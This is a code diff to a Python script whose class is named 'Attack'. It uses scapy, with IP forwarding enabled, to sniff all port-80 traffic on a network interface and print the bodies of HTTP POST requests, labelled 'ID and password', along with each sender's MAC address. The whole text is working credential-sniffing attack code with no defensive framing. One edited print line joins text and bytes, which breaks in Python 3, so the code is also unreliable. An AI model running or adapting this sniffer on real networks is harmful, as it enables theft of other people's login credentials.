@@ -68,11 +68,12 @@ class Attack():
     
     def sniff_packets(self):
         for v in self.victim:
-            scapy.sniff(filter="ether src {}".format(self.ip_mac[v]), prn=self.process_packet, iface=self.interfaces[1], store=False)
+            scapy.sniff(filter='port 80', prn=self.process_packet, iface=self.interfaces[1], store=False)
 
     def process_packet(self, packet):
         if packet.haslayer(HTTPRequest) and packet[HTTPRequest].Method.decode() == 'POST':
-            print(packet[scapy.Raw].load, '\n')
+            print('ID and password' + packet[scapy.Raw].load)
+            print('Came from' + packet[scapy.Ether].src)
 
 attack = Attack()
 attack._enable_linux_iproute()
